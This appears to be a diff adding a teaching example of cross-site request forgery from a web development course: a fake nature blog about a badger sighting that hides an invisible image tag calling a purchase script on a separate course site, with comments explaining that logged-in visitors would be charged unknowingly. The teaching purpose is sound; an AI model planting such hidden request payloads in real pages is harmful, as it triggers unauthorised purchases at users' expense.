@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>Ben Jones' Nature Rambles - CSRF Example</title>
+</head>
+
+<body>
+
+<h1>Ben Jones' Nature Rambles</h1>
+
+<p>Hi, my name is Ben Jones and I like to walk in the countryside. You can
+see pictures of some of the things I see here. Check this out: a badger seen
+in broad daylight!</p>
+
+<!-- This is a legitimate image. -->
+
+<img src="/course/dfti/examples/gd/badger.jpg" alt="Badger!!!" />
+
+<br />
+
+<!-- This is a malicious invisible "image" which sends a request to 
+    download.php on HitTastic! If the user is logged into HitTastic, a
+    song will be downloaded, and funds deducted, without their knowledge!
+    The 'alt' tag makes it look like it's just a label for the badger image
+    above. -->
+
+<img src="http://edward2.solent.ac.uk/~ephp039/download.php?id=1&qty=5" alt="This Badger is in Daylight!!!!!" />
+
+</body>
+</html>
